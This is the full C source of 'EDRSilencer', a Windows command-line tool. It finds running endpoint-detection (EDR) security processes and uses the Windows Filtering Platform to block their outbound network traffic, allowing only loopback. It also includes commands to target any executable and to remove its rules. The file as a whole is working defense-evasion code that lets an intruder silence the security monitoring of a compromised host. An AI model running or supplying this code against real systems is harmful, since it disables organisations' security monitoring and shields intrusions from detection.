#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

#include <winsock2.h>
#include <windows.h>
#include <fwpmu.h> // For Windows Filtering Platform

#include "utils.h"
#include "process.h"

// Globally unique identifiers (GUIDs) for our WFP provider and sublayer
const GUID ProviderGUID = { 0x4e27e7d4, 0x2442, 0x4891, { 0x91, 0x2e, 0x42, 0x5, 0x42, 0x8a, 0x85, 0x55 } };
const GUID SubLayerGUID = { 0x4e27e7d5, 0x2442, 0x4891, { 0x91, 0x2e, 0x42, 0x5, 0x42, 0x8a, 0x85, 0x55 } };
const wchar_t* ruleDescription = L"Blocks outbound connections for a specific EDR process";




// Helper function to apply the two-layer permit/block filter system for a given AppID
void applyStealthFilters(HANDLE hEngine, const GUID* subLayerGuid, PCWSTR fullPath) {
    FWP_BYTE_BLOB* appId = NULL;
    DWORD result = 0;
    UINT64 filterId = 0;

    if (CustomFwpmGetAppIdFromFileName0(fullPath, &appId) != 0) {
        wprintf(L"[-] Failed to get AppID for %s\n", fullPath);
        return;
    }

    // --- Permit Loopback Filter for IPv4 ---
    FWPM_FILTER0 permitFilterV4 = {0};
    permitFilterV4.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
    permitFilterV4.action.type = FWP_ACTION_PERMIT;
    permitFilterV4.subLayerKey = *subLayerGuid;
    permitFilterV4.weight.type = FWP_UINT8;
    permitFilterV4.weight.uint8 = 14; // Lower weight than the block filter
    permitFilterV4.numFilterConditions = 2;
    permitFilterV4.displayData.name = L"Permit Loopback IPv4 for EDR";
    permitFilterV4.displayData.description = L"Permits EDR process loopback traffic.";

    FWPM_FILTER_CONDITION0 conditionsV4[2] = {0};
    conditionsV4[0].fieldKey = FWPM_CONDITION_ALE_APP_ID;
    conditionsV4[0].matchType = FWP_MATCH_EQUAL;
    conditionsV4[0].conditionValue.type = FWP_BYTE_BLOB_TYPE;
    conditionsV4[0].conditionValue.byteBlob = appId;

    conditionsV4[1].fieldKey = FWPM_CONDITION_IP_REMOTE_ADDRESS;
    conditionsV4[1].matchType = FWP_MATCH_EQUAL;
    conditionsV4[1].conditionValue.type = FWP_UINT32;
    conditionsV4[1].conditionValue.uint32 = 0x7F000001; // 127.0.0.1

    permitFilterV4.filterCondition = conditionsV4;

    result = FwpmFilterAdd0(hEngine, &permitFilterV4, NULL, &filterId);
    if (result != ERROR_SUCCESS) {
        wprintf(L"[-] Failed to add IPv4 permit filter for %s. Error: %d\n", fullPath, result);
    } else {
        wprintf(L"[+] IPv4 permit filter added for %s with ID %llu.\n", fullPath, filterId);
    }

    // --- Block All Filter for IPv4 ---
    FWPM_FILTER0 blockFilterV4 = {0};
    blockFilterV4.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
    blockFilterV4.action.type = FWP_ACTION_BLOCK;
    blockFilterV4.subLayerKey = *subLayerGuid;
    blockFilterV4.weight.type = FWP_UINT8;
    blockFilterV4.weight.uint8 = 15; // Higher weight
    blockFilterV4.numFilterConditions = 1;
    blockFilterV4.displayData.name = L"Block Outbound IPv4 for EDR";
    blockFilterV4.displayData.description = L"Blocks all outbound traffic for a specific EDR process.";

    FWPM_FILTER_CONDITION0 blockConditionV4 = {0};
    blockConditionV4.fieldKey = FWPM_CONDITION_ALE_APP_ID;
    blockConditionV4.matchType = FWP_MATCH_EQUAL;
    blockConditionV4.conditionValue.type = FWP_BYTE_BLOB_TYPE;
    blockConditionV4.conditionValue.byteBlob = appId;
    blockFilterV4.filterCondition = &blockConditionV4;

    result = FwpmFilterAdd0(hEngine, &blockFilterV4, NULL, &filterId);
    if (result != ERROR_SUCCESS) {
        wprintf(L"[-] Failed to add IPv4 block filter for %s. Error: %d\n", fullPath, result);
    } else {
        wprintf(L"[+] IPv4 block filter added for %s with ID %llu.\n", fullPath, filterId);
    }

    // --- Permit Loopback Filter for IPv6 ---
    FWPM_FILTER0 permitFilterV6 = {0};
    permitFilterV6.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
    permitFilterV6.action.type = FWP_ACTION_PERMIT;
    permitFilterV6.subLayerKey = *subLayerGuid;
    permitFilterV6.weight.type = FWP_UINT8;
    permitFilterV6.weight.uint8 = 14;
    permitFilterV6.numFilterConditions = 2;
    permitFilterV6.displayData.name = L"Permit Loopback IPv6 for EDR";
    permitFilterV6.displayData.description = L"Permits EDR process loopback traffic.";

    FWP_BYTE_ARRAY16 ipv6LoopbackAddr;
    memset(&ipv6LoopbackAddr, 0, sizeof(ipv6LoopbackAddr));
    ipv6LoopbackAddr.byteArray16[15] = 1; // Represents ::1

    FWPM_FILTER_CONDITION0 conditionsV6[2] = {0};
    conditionsV6[0].fieldKey = FWPM_CONDITION_ALE_APP_ID;
    conditionsV6[0].matchType = FWP_MATCH_EQUAL;
    conditionsV6[0].conditionValue.type = FWP_BYTE_BLOB_TYPE;
    conditionsV6[0].conditionValue.byteBlob = appId;

    conditionsV6[1].fieldKey = FWPM_CONDITION_IP_REMOTE_ADDRESS;
    conditionsV6[1].matchType = FWP_MATCH_EQUAL;
    conditionsV6[1].conditionValue.type = FWP_BYTE_ARRAY16_TYPE;
    conditionsV6[1].conditionValue.byteArray16 = &ipv6LoopbackAddr;

    permitFilterV6.filterCondition = conditionsV6;

    result = FwpmFilterAdd0(hEngine, &permitFilterV6, NULL, &filterId);
    if (result != ERROR_SUCCESS) {
        wprintf(L"[-] Failed to add IPv6 permit filter for %s. Error: %d\n", fullPath, result);
    } else {
        wprintf(L"[+] IPv6 permit filter added for %s with ID %llu.\n", fullPath, filterId);
    }

    // --- Block All Filter for IPv6 ---
    FWPM_FILTER0 blockFilterV6 = {0};
    blockFilterV6.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
    blockFilterV6.action.type = FWP_ACTION_BLOCK;
    blockFilterV6.subLayerKey = *subLayerGuid;
    blockFilterV6.weight.type = FWP_UINT8;
    blockFilterV6.weight.uint8 = 15;
    blockFilterV6.numFilterConditions = 1;
    blockFilterV6.displayData.name = L"Block Outbound IPv6 for EDR";
    blockFilterV6.displayData.description = L"Blocks all outbound traffic for a specific EDR process.";

    FWPM_FILTER_CONDITION0 blockConditionV6 = {0};
    blockConditionV6.fieldKey = FWPM_CONDITION_ALE_APP_ID;
    blockConditionV6.matchType = FWP_MATCH_EQUAL;
    blockConditionV6.conditionValue.type = FWP_BYTE_BLOB_TYPE;
    blockConditionV6.conditionValue.byteBlob = appId;
    blockFilterV6.filterCondition = &blockConditionV6;

    result = FwpmFilterAdd0(hEngine, &blockFilterV6, NULL, &filterId);
    if (result != ERROR_SUCCESS) {
        wprintf(L"[-] Failed to add IPv6 block filter for %s. Error: %d\n", fullPath, result);
    } else {
        wprintf(L"[+] IPv6 block filter added for %s with ID %llu.\n", fullPath, filterId);
    }

    FreeAppId(appId);
}

// Helper function to initialize WFP engine and add provider/sublayer
BOOL initializeWfp(HANDLE* hEngine) {
    DWORD result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, hEngine);
    if (result != ERROR_SUCCESS) {
        printf("[-] FwpmEngineOpen0 failed. Error: 0x%lX\n", result);
        return FALSE;
    }

    FWPM_PROVIDER0 provider = { 0 };
    provider.providerKey = ProviderGUID;
    provider.displayData.name = EDR_PROVIDER_NAME;
    provider.displayData.description = EDR_PROVIDER_DESCRIPTION;
    result = FwpmProviderAdd0(*hEngine, &provider, NULL);
    if (result != ERROR_SUCCESS && (long)result != FWP_E_ALREADY_EXISTS) {
        printf("[-] FwpmProviderAdd0 failed. Error: 0x%lX\n", result);
        FwpmEngineClose0(*hEngine);
        return FALSE;
    }

    FWPM_SUBLAYER0 subLayer = { 0 };
    subLayer.subLayerKey = SubLayerGUID;
    subLayer.displayData.name = EDR_SUBLAYER_NAME;
    subLayer.displayData.description = EDR_SUBLAYER_DESCRIPTION;
    subLayer.providerKey = (GUID*)&ProviderGUID;
    subLayer.weight = 0x01;
    result = FwpmSubLayerAdd0(*hEngine, &subLayer, NULL);
    if (result != ERROR_SUCCESS && (long)result != FWP_E_ALREADY_EXISTS) {
        printf("[-] FwpmSubLayerAdd0 failed. Error: 0x%lX\n", result);
        FwpmEngineClose0(*hEngine);
        return FALSE;
    }

    return TRUE;
}

// Helper function to close the WFP engine handle
void shutdownWfp(HANDLE hEngine) {
    if (hEngine) {
        FwpmEngineClose0(hEngine);
        printf("[+] WFP engine handle closed.\n");
    }
}

void addProcessRule(const char* processPath) {
    HANDLE hEngine = NULL;
    if (!initializeWfp(&hEngine)) {
        return;
    }

    wchar_t processPathW[MAX_PATH];
    mbstowcs(processPathW, processPath, MAX_PATH);

    // Directly call the filter function. It will handle AppID creation and logging.
    applyStealthFilters(hEngine, &SubLayerGUID, processPathW);

    shutdownWfp(hEngine);
}

// Function to configure network filters
void configureNetworkFilters() {
    HANDLE hEngine = NULL;
    if (!initializeWfp(&hEngine)) {
        return;
    }

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create snapshot of processes.\n");
        shutdownWfp(hEngine);
        return;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (isProcessInList(pe32.szExeFile)) {
                printf("[+] Found EDR process: %s\n", pe32.szExeFile);
                WCHAR fullPath[MAX_PATH];
                if (getProcessFullPath(pe32.th32ProcessID, fullPath, MAX_PATH)) {
                    // Directly call the filter function. It will handle the AppID internally.
                    applyStealthFilters(hEngine, &SubLayerGUID, fullPath);
                } else {
                    // Optional: Add a log if getting the path fails for a matched process
                    printf("    [-] Could not get full path for process: %s\n", pe32.szExeFile);
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    shutdownWfp(hEngine);
}

// Function to remove all rules
void removeAllRules() {
    HANDLE hEngine = NULL;
    DWORD result = 0;

    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        printf("[-] FwpmEngineOpen0 failed. Error: 0x%lX\n", result);
        return;
    }

    // By deleting the sublayer, all filters within that sublayer are automatically removed.
    result = FwpmSubLayerDeleteByKey0(hEngine, &SubLayerGUID);
    if (result == ERROR_SUCCESS) {
        printf("[+] Sublayer and all associated filters removed successfully.\n");
        } else if ((long)result == FWP_E_SUBLAYER_NOT_FOUND) {
        printf("[-] Sublayer not found. No rules to remove.\n");
    } else {
        printf("[-] FwpmSubLayerDeleteByKey0 failed. Error: 0x%lX\n", result);
    }

    // After removing the sublayer, we can remove the provider.
    result = FwpmProviderDeleteByKey0(hEngine, &ProviderGUID);
    if (result == ERROR_SUCCESS) {
        printf("[+] Provider removed successfully.\n");
        } else if ((long)result == FWP_E_PROVIDER_NOT_FOUND) {
        printf("[-] Provider not found.\n");
    } else {
        printf("[-] FwpmProviderDeleteByKey0 failed. Error: 0x%lX\n", result);
    }

    FwpmEngineClose0(hEngine);
}

// Function to remove a rule by ID
void removeRuleById(UINT64 ruleId) {
    HANDLE hEngine = NULL;
    DWORD result = 0;

    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        printf("[-] FwpmEngineOpen0 failed. Error: 0x%lX\n", result);
        return;
    }

    result = FwpmFilterDeleteById0(hEngine, ruleId);
    if (result == ERROR_SUCCESS) {
        printf("[+] Rule with ID %llu removed successfully.\n", ruleId);
        } else if ((long)result == FWP_E_FILTER_NOT_FOUND) {
        printf("[-] Rule with ID %llu not found.\n", ruleId);
    } else {
        printf("[-] Failed to remove rule with ID %llu. Error: 0x%lX\n", ruleId, result);
    }

    FwpmEngineClose0(hEngine);
}

void showHelp() {
    printf("Usage: EDRSilencer.exe <command>\n");
    printf("Version: 1.5\n\n");
    printf("Commands:\n");
     printf("  blockedr    - Add network rules to block traffic of all detected target processes.\n");
    printf("  add <path>  - Add a network rule to block traffic for a specific process.\n");
    printf("                Example: EDRSilencer.exe add \"C:\\Windows\\System32\\curl.exe\"\n");
    printf("  removeall   - Remove all network rules applied by this tool.\n");
    printf("  remove <id> - Remove a specific network rule by its ID.\n");
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        showHelp();
        return 1;
    }

    if (_stricmp(argv[1], "-h") == 0 || _stricmp(argv[1], "--help") == 0) {
        showHelp();
        return 1;
    }
    
    if (!CheckProcessIntegrityLevel()) {
        return 1;
    }

    if (strcmp(argv[1], "blockedr") == 0) {
        configureNetworkFilters();
    } else if (strcmp(argv[1], "add") == 0) {
        if (argc < 3) {
            printf("[-] Missing argument. Please provide the full path of the process.\n");
            return 1;
        }
        addProcessRule(argv[2]);
    } else if (strcmp(argv[1], "removeall") == 0) {
        removeAllRules();
    } else if (strcmp(argv[1], "remove") == 0) {
        if (argc < 3) {
            printf("[-] Missing argument. Please provide the rule ID.\n");
            return 1;
        }
        char *endptr;
        errno = 0;
        UINT64 ruleId = strtoull(argv[2], &endptr, 10);
        if (errno != 0 || endptr == argv[2]) {
            printf("[-] Invalid rule ID provided.\n");
            return 1;
        }
        removeRuleById(ruleId);
    } else {
        printf("[-] Invalid command: \"%s\". Use -h for help.\n", argv[1]);
        return 1;
    }
    return 0;
}